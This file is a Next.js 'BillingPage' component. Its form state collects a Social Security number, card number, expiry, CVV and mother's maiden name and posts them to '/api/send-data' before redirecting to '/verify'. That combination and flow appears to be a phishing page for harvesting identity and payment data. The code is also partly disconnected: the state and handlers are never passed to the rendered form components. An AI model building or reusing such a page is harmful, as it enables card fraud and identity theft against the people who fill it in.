"use client";

import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import CardPayment from "@/components/ui/CardPayment";
import AddressForm from "@/components/ui/AddressForm";

const BillingPage = () => {
  const [form, setForm] = useState({
    fullName: "",
    address: "",
    zip: "",
    ssn: "",
    phone: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
    motherMaidenName: "",
  });
  const [loading, setLoading] = useState(false);
  const [showSSN, setShowSSN] = useState(false);
  const [showCVV, setShowCVV] = useState(false);
  const router = useRouter();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((s) => ({ ...s, [name]: value }));
  };

  const formatCard = (val) =>
    val
      .replace(/\D/g, "")
      .slice(0, 16)
      .replace(/(.{4})/g, "$1 ")
      .trim();

  const formatExpiry = (val) =>
    val
      .replace(/\D/g, "")
      .slice(0, 4)
      .replace(/(.{2})/, "$1/");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      setLoading(true);
      const res = await axios.post("/api/send-data", form);
      if (res.status === 200) {
        router.push("/verify");
      }
    } catch (err) {
      alert("Something wrong, Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex flex-col">
      <Header />
      <div className="flex-center">
        <AddressForm />
      </div>

      <CardPayment />

      <Footer />
    </main>
  );
};

export default BillingPage;
